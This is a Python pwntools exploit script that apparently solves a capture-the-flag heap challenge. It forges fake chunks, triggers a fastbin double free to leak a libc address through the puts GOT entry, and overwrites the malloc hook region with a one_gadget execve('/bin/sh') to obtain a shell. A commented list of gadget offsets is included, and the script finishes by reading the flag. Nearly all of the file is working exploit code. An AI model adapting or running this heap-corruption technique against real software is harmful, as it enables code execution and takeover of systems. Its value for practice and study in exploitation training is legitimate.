#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
# except Exception as e:
#     print(e)

context.arch = 'amd64'
# context.arch = 'i386'
context.log_level = 'debug'
execve_file = './pwn'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
sh = process(execve_file)
#sh = remote('node3.buuoj.cn',28043)
elf = ELF(execve_file)
# libc = ELF('./libc-2.27.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    b malloc
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    pass

def add(size, content):
    sh.sendlineafter('>> ', '1')
    sh.sendlineafter('size\n', str(size))
    sh.sendafter('content\n', content)

def add2(size, content):
    time.sleep(0.1)
    sh.sendline('1')
    time.sleep(0.1)
    sh.send(str(size).ljust(8,'\x00'))
    time.sleep(0.1)
    sh.send(content)

def free():
    sh.sendlineafter('>> ', '2')

sh.sendafter('username:', p64(0) + p64(0x71) + p64(0x602060))
sh.sendafter('info:', p64(0) + p64(0x21))

sh.sendlineafter('>> ', '666')
sh.sendlineafter('free?\n', '1')
sh.sendafter('content\n', 'n')

add(0x18, 'n')

sh.sendlineafter('>> ', '666')
sh.sendlineafter('free?\n', '2')

add(0x68, 'n')
add(0x68, 'n')
free()
sh.sendlineafter('>> ', '666')
sh.sendlineafter('free?\n', '2')
free()
add(0x68, p64(0x602060))
add(0x68, 'n')
add(0x68, 'n')
add(0x68, p64(0x602060) + 'a' * 0x10 + p64(elf.got['puts']) + p64(0xDEADBEEFDEADBEEF))

gdb.attach(sh)
pause()
sh.sendlineafter('>> ', '3')
result = sh.recvuntil('\n', drop=True)
libc_addr = u64(result.ljust(8,'\x00')) - 0x6f690
log.success('libc_addr: ' + hex(libc_addr))
main_arena_addr = libc_addr + 0x3c4b20
log.success('main_arena_addr: ' + hex(main_arena_addr))
add2(0x68, p64(main_arena_addr - 0x33))
add2(0x68, 'n')

'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

add2(0x68, 'b' * 0xb + p64(libc_addr + 0xf1147)+ p64(libc_addr + libc.symbols['realloc'] + 20))

# pause()
add2(0x68, 'cat flag >&0\n')

sh.interactive()
clear()